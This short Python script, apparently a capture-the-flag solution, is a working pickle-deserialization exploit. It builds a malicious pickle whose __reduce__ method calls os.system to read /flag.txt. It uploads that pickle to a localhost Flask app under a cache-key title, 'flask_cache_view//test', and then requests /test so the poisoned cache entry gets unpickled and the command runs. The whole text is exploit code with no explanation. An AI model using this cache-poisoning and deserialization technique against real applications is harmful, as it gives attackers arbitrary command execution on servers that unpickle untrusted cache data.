from requests import get, post
import pickle
import os
import io

class pwn(object):
    def __reduce__(self):
        return os.system, ('cat /flag.txt',)

p = b'!' + pickle.dumps(pwn())
print(len(p))
print(p)
pickle.loads(pickle.dumps(pwn()))
post(
    'http://localhost:4000/',
    files={"content": io.BytesIO(p)},
    data={"title": "flask_cache_view//test"}
)

get("http://localhost:4000/test")
